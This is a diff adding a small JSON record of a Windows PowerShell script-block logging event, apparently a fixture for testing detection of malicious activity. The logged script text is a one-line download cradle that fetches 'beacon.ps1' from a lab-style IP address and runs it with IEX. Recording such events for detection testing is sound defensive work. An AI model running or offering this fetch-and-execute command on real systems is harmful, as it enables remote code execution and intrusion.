@@ -1,0 +1,13 @@
+{
+  "EventID": 4104,
+  "Channel": "Microsoft-Windows-PowerShell/Operational",
+  "UtcTime": "2026-10-19T04:15:30.000Z",
+  "Computer": "WIN10-CLIENT01.corp.local",
+  "EventData": {
+    "ScriptBlockText": "$client = New-Object System.Net.WebClient; $payload = $client.DownloadString('http://192.168.56.1/beacon.ps1'); IEX $payload",
+    "ScriptBlockId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  }
+}
